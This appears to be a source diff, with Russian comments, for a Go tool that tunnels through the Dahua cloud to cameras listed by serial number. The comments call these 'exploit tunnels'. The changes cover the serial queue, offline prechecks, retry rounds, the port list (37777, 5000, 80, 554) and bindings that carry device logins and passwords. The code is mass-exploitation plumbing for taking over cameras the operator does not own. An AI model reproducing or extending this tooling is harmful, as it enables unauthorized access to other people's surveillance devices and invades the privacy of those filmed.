@@ -48,6 +48,15 @@ type Binding struct {
 	IsRelay bool
 }
 
+// HasPort сообщает, доступен ли порт на данном биндинге.
+// Для релейных туннелей (IsRelay) порт 80 никогда не пробрасывается облаком Dahua.
+func (b Binding) HasPort(port int) bool {
+	if b.IsRelay && port == 80 {
+		return false
+	}
+	return true
+}
+
 // Provider — источник биндингов. Один на прогон.
 type Provider interface {
 	// Acquire блокируется до готовности следующего серийника.
@@ -68,8 +77,8 @@ type Provider interface {
 	Shutdown()
 }
 
-// defaultTunnelPorts — порты камеры для туннеля эксплойта.
-var defaultTunnelPorts = []int{5000, 80, 37777, 554}
+// defaultTunnelPorts — порты камеры для туннеля эксплойта (37777 первый, как в dh-fwd).
+var defaultTunnelPorts = []int{37777, 5000, 80, 554}
 
 // portSpecs — порты камеры → спецификации форвардов (локальный ephemeral).
 func portSpecs(ports []int) []PortSpec {
@@ -82,36 +91,32 @@ func portSpecs(ports []int) []PortSpec {
 
 // ── InProcessProvider ────────────────────────────────────────────────
 
+// InProcessProvider — встроенный синхронный провайдер (один тяжёлый воркер на поток).
+// Каждый рабочий поток вызывает Acquire(ctx) и напрямую поднимает туннель
+// без очередей-буферов и без риска остывания сессий.
 type InProcessProvider struct {
-	mu      sync.Mutex
-	serials []string
-	idx     int
-	dead    []string
-	onLog   func(string)
-
-	// attempts — сколько раз серийнику пытались поднять туннель за ВЕСЬ
-	// прогон (все круги ре-очереди суммарно). Достиг maxAcquireAttempts —
-	// окончательное исключение из очереди: мёртвый серийник больше не
-	// жжёт по 20-80 хендшейков на кругах.
+	mu       sync.Mutex
+	serials  []string
+	idx      int
+	dead     []string
+	onLog    func(string)
 	attempts map[string]int
 
-	// OnDead — серийник завершился в dead-листе (probe miss / 404 /
-	// туннель не встал). Драйвер отмечает его в статистике, чтобы
-	// прогрессбар двигался и на дохлых (они до exploitOne не доходят).
-	// nil = никто не слушает.
+	// OnDead — вызывается, когда серийник окончательно признан мёртвым
+	// (404, auth error или исчерпаны все попытки).
 	OnDead func(serial, reason string)
 }
 
-// maxAcquireAttempts — жёсткий бюджет туннель-подъёмов на серийник за
-// прогон: первичная попытка + один ре-раунд. Каждый подъём внутри себя —
-// StartSupervised (3 попытки × внутренние ретраи), так что 2 = до шести
-// полноценных хендшейков; после этого вердикт окончательный.
+// maxAcquireAttempts — число попыток подъёма туннеля за весь прогон (с учётом кругов).
 var maxAcquireAttempts = 2
 
-// NewInProcess — встроенный провайдер: пречек по облаку + StartSupervised
-// на каждый серийник. Лог — колбэк (может быть nil).
+// NewInProcess создаёт синхронный провайдер для списка серийников.
 func NewInProcess(serials []string, onLog func(string)) *InProcessProvider {
-	return &InProcessProvider{serials: serials, onLog: onLog, attempts: make(map[string]int)}
+	return &InProcessProvider{
+		serials:  serials,
+		onLog:    onLog,
+		attempts: make(map[string]int),
+	}
 }
 
 func (p *InProcessProvider) logf(format string, args ...any) {
@@ -124,8 +129,15 @@ func (p *InProcessProvider) Acquire(ctx context.Context) (Binding, error) {
 	for {
 		p.mu.Lock()
 		if p.idx >= len(p.serials) {
-			p.mu.Unlock()
-			return Binding{}, ErrExhausted
+			if len(p.dead) > 0 {
+				p.serials = p.dead
+				p.dead = nil
+				p.idx = 0
+				p.logf(i18n.Tr("ре-очередь: запуск 2-го круга для %d недоступных серийников"), len(p.serials))
+			} else {
+				p.mu.Unlock()
+				return Binding{}, ErrExhausted
+			}
 		}
 		serial := p.serials[p.idx]
 		p.idx++
@@ -135,88 +147,68 @@ func (p *InProcessProvider) Acquire(ctx context.Context) (Binding, error) {
 			return Binding{}, err
 		}
 
-		// Soft-пречек: мёртвые по облаку — в dead-лист (ре-очередь), без
-		// затрат на туннель. Probe miss не приговор — серийник вернётся
-		// вторым кругом. Пречек идёт через общий облачный мультиплексор
-		// (ProbeOnline: лимит одновременных + TTL-кеш + дедуп) — старая
-		// схема (свой UDP-сокет на облако на каждый воркер) душила
-		// облако и с ним же хендшейки туннелей.
-		if !ProbeOnline(serial) {
-			p.mu.Lock()
-			p.dead = append(p.dead, serial)
-			p.mu.Unlock()
+		// Быстрый пречек жизни (p2p-channel round-trip, ~1-2с): авторитетный
+		// dead (404) отсекается без затрат на полный handshake. Тишина/ошибка
+		// — НЕ вердикт (облако молча дропает): такие серийники идут в туннель
+		// как раньше.
+		if alive, _, verr := VerifyDevice(serial, p.logf); verr == nil && !alive {
 			if p.OnDead != nil {
-				p.OnDead(serial, "probe miss")
+				p.OnDead(serial, "offline (verify)")
 			}
-			p.logf("%s — probe miss, offline", serial)
+			p.logf("%s — offline (verify)", serial)
 			continue
 		}
 
-		// Джиттер на подъёме туннеля: сглаживает стартовую волну
-		// хендшейков (приём oluhradar — 100-250мс в чекере; тут 50-150мс,
-		// т.к. init-семафор уже ограничивает одновременность).
-		time.Sleep(time.Duration(50+rand.Intn(100)) * time.Millisecond)
+		// Небольшой джиттер перед подъёмом для предотвращения UDP-шторма при старте воркеров
+		time.Sleep(time.Duration(20+rand.Intn(60)) * time.Millisecond)
 
 		f, err := StartSupervised(ctx, serial, portSpecs(defaultTunnelPorts), func(line string) {
 			p.logf("%s", line)
 		})
 		if err != nil {
-			// отмена прогона — единственный фатал; всё остальное
-			// (404, таймауты, 3 исчерпанных попытки) — серийник в
-			// dead-лист: его подберёт ReQueue вторым кругом. Раньше
-			// любая ошибка кроме 404 убивала воркер — первый дохлый
-			// серийник мог положить весь прогон.
 			if ctx.Err() != nil {
 				return Binding{}, ctx.Err()
 			}
 			p.mu.Lock()
-			p.dead = append(p.dead, serial)
-			p.mu.Unlock()
 			if errors.Is(err, ErrDeviceNotFound) {
 				if p.OnDead != nil {
 					p.OnDead(serial, "offline (404)")
 				}
 				p.logf("%s — offline (404)", serial)
-			} else if errors.Is(err, ErrAuthRequired) {
-				// Терминальный вердикт: устройство требует tunnel-auth
-				// (Type 1). Кредов у прогона нет, рестарты и ре-очередь
-				// бессмысленны — исключаем из очереди окончательно.
+			} else if errors.Is(err, ErrAuthRequired) || isAuthError(err) {
 				if p.OnDead != nil {
 					p.OnDead(serial, "нужны креды (type 1)")
 				}
 				p.logf(i18n.Tr("%s — устройство требует tunnel-auth (type 1) — без кредов туннель невозможен, из очереди исключён"), serial)
 			} else {
 				p.attempts[serial]++
-				if p.OnDead != nil {
-					p.OnDead(serial, fmt.Sprintf("туннель: %v", err))
-				}
 				if p.attempts[serial] >= maxAcquireAttempts {
-					// бюджет исчерпан — окончательно исключаем: ре-очередь
-					// для такого серийника это 20-80 хендшейков в никуда
 					p.logf(i18n.Tr("%s — исчерпан (%d туннель-подъёма за прогон) — из очереди исключён окончательно"), serial, p.attempts[serial])
+					if p.OnDead != nil {
+						p.OnDead(serial, fmt.Sprintf("туннель: %v", err))
+					}
 				} else {
 					p.logf(i18n.Tr("%s — туннель не встал (%v) — в ре-очередь (попытка %d/%d)"), serial, err, p.attempts[serial], maxAcquireAttempts)
 					p.dead = append(p.dead, serial)
 				}
 			}
+			p.mu.Unlock()
 			continue
 		}
-		isRelay := f.IsRelay()
+
 		return Binding{
 			Serial:  serial,
 			Tunnel:  fwdTunnel{f: f},
 			Login:   f.User,
 			Pass:    f.Pass,
 			Dtype:   f.Dtype,
-			IsRelay: isRelay,
+			IsRelay: f.IsRelay(),
 		}, nil
 	}
 }
 
-// Done — в in-process режиме батчей нет, буккипинга не требуется.
 func (p *InProcessProvider) Done(serial string) {}
 
-// ReQueue — мёртвые серийники в конец очереди; возвращает число.
 func (p *InProcessProvider) ReQueue() int {
 	p.mu.Lock()
 	defer p.mu.Unlock()
@@ -229,7 +221,6 @@ func (p *InProcessProvider) ReQueue() int {
 	return n
 }
 
-// DeadCount — свежие dead'ы последнего круга (ещё не ре-очередены).
 func (p *InProcessProvider) DeadCount() int {
 	p.mu.Lock()
 	defer p.mu.Unlock()
